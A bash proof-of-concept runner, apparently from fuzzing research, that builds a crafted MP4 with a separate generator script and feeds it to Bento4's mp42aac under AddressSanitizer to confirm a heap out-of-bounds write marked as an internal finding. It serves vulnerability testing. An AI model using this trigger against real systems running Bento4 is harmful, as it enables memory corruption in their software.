#!/bin/bash
# PoC runner for: Heap OOB Write in AP4_NullTerminatedStringAtom
# CVE: N/A (internal finding)

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4Atom_cpp"
BINARY="/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac"
INPUT="${POC_DIR}/vuln_001.mp4"
RESULT="${POC_DIR}/vuln_001_result.txt"
ASAN_LOG="${POC_DIR}/asan.log"

# Step 1: Generate the malicious MP4
echo "[*] Generating malicious MP4..."
python3 "${POC_DIR}/vuln_001_gen.py"

# Step 2: Run mp42aac with ASAN options
echo "[*] Running mp42aac..."
ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG}" \
  "${BINARY}" \
  "${INPUT}" \
  /dev/null \
  > "${RESULT}" 2>&1 || true

echo "[*] mp42aac exited."

# Step 3: Append any ASAN/UBSAN errors from asan.log.* files to result.txt
for f in "${POC_DIR}/asan.log."*; do
  [ -f "$f" ] && cat "$f" >> "${RESULT}"
done

echo "[*] Done. Results in: ${RESULT}"
cat "${RESULT}"
